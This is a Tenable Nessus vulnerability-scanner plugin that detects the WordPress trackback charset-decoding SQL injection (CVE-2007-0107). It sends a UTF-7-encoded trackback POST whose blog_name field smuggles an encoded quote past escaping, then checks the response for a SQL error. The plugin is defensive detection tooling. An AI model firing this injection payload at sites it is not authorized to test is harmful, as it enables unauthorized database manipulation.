#
# Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24011);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/11/02 20:50:26 $");

  script_cve_id("CVE-2007-0107");
  script_bugtraq_id(21896, 21907);
  script_osvdb_id(31579);

  script_name(english:"WordPress Trackback Charset Decoding SQL Injection");
  script_summary(english:"Checks for a SQL injection in WordPress.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection attack.");
  script_set_attribute(attribute:"description", value:
"The version of WordPress on the remote host supports trackbacks in
alternate character sets and decodes them after escaping SQL
parameters. By specifying an alternate character set and encoding
input with that character set while submitting a trackback, an
unauthenticated, remote attacker can bypass the application's
parameter sanitation code and manipulate database queries.

Note that exploitation of this issue is only possible when PHP's
mbstring extension is installed, which is the case with the remote
host.");
  script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_022007.141.html");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2007/Jan/125");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/development/2007/01/wordpress-206/");
  script_set_attribute(attribute:"solution", value:"Upgrade to WordPress version 2.0.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/01/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/01/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/01/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# First we need a post id.
res = http_send_recv3(
  method : "GET",
  item   : dir + "/index.php",
  port   : port,
  exit_on_fail : TRUE
);

pat = dir + '/([^" #]+)#(comments|respond)"';
pid = NULL;
matches = egrep(pattern:pat, string:res);
if (matches)
{
  foreach match (split(matches))
  {
    match = chomp(match);
    value = eregmatch(pattern:pat, string:match);
    if (!isnull(value))
    {
      pid = value[1];
      break;
    }
  }
}

# If we have one...
if (pid)
{
  # Make sure the affected script and posting id exist.
  #
  # nb: the format of the trackback URL depends on whether or not
  #     pretty permalinks are in use.
  if ("?p=" >< pid) url = dir + "/wp-trackback.php" + pid;
  else
  {
    if (pid !~ "/$") pid = pid + '/';
    url = dir + "/" + pid + "trackback/";
  }

  w = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: TRUE);
  res = strcat(w[0], w[1], '\r\n', w[2]);
  # If they do...
  if ("X-Pingback: " >< res)
  {
    # Try to exploit the flaw to generate a SQL error.
    postdata =
      "charset=UTF-7&" +
      "title=None&" +
      "url=None&" +
      "excerpt=None&" +
      "blog_name=" + SCRIPT_NAME + "%2BACc-,";

    w = http_send_recv3(
      method : "POST",
      item   : url,
      port   : port,
      data   : postdata,
      content_type : "application/x-www-form-urlencoded",
      exit_on_fail: TRUE
    );
    res = w[2];

    # There's a problem if we see an error.
    if (
      "error in your SQL syntax" &&
      "AND ( comment_author = '" + SCRIPT_NAME + "'," >< res
    )
    {
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      security_warning(port);
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
